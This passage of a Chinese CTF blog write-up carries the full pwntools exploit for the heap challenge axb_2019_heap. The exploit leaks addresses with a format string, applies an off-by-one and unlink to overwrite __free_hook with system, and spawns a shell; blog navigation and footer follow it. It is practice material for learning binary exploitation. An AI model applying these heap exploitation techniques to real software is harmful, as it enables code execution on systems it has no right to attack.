class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",28733)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"to create (0-10):"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter a size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">note = pro_base + <span class="number">0x0202060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">'cccc'</span>)</span><br><span class="line">print(hex(note))</span><br><span class="line"></span><br><span class="line">fd = note - <span class="number">0x18</span></span><br><span class="line">bk = note - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p8(<span class="number">0xa0</span>)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">print(hex(note))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(free_hook) + p64(<span class="number">0x98</span>)</span><br><span class="line">payload += p64(note + <span class="number">24</span>) +<span class="string">"/bin/sh\x00"</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">print(hex(note))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>组合拳，题型：fmt + off by one + unlink</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/unlink/" rel="tag"># unlink</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/25/00-17-undefined/" rel="prev" title="npuctf_2020_easyheap详解">
+      <i class="fa fa-chevron-left"></i> npuctf_2020_easyheap详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/25/23-34-undefined/" rel="next" title="wdb_2018_2nd_easyfmt详解">
+      wdb_2018_2nd_easyfmt详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          المحتويات
+        </li>
+        <li class="sidebar-nav-overview">
+          عام
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序流程"><span class="nav-number">1.</span> <span class="nav-text">程序流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#调试"><span class="nav-number">1.1.</span> <span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#详细过程"><span class="nav-number">3.</span> <span class="nav-text">详细过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-格式化字符串"><span class="nav-number">3.1.</span> <span class="nav-text">1.格式化字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-unlink"><span class="nav-number">3.2.</span> <span class="nav-text">2.unlink</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-修改-free-hook为system"><span class="nav-number">3.3.</span> <span class="nav-text">3.修改__free_hook为system</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完整exp"><span class="nav-number">4.</span> <span class="nav-text">完整exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Shuwen</p>
+  <div class="site-description" itemprop="description">生活 & 学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">المقالات</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">التصنيفات</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-name">الوسوم</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shuwen</span>
+</div>
+  <div class="powered-by">تطبيق الموقع <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
